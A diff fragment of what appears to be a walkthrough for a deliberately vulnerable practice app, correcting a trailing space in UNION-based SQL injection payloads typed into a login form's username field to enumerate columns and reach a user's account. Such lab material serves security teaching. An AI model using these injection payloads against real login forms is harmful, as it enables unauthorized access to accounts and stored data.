@@ -17,7 +17,7 @@
     3. Login to access Tyler's account.
 
 - **UNION SQL Injection:**
-    1. Put `tyler' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL FROM users--` (note there is a space after --) in the username field.
+    1. Put `tyler' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL FROM users-- ` (note there is a space after --) in the username field.
     2. Enter anything in the password field.
     3. You will see this error "tyler' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL FROM users-- username not found or 123 password incorrect. Try again"
     4. Now out `tyler' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users-- `(note there is a space after --) in the username field.
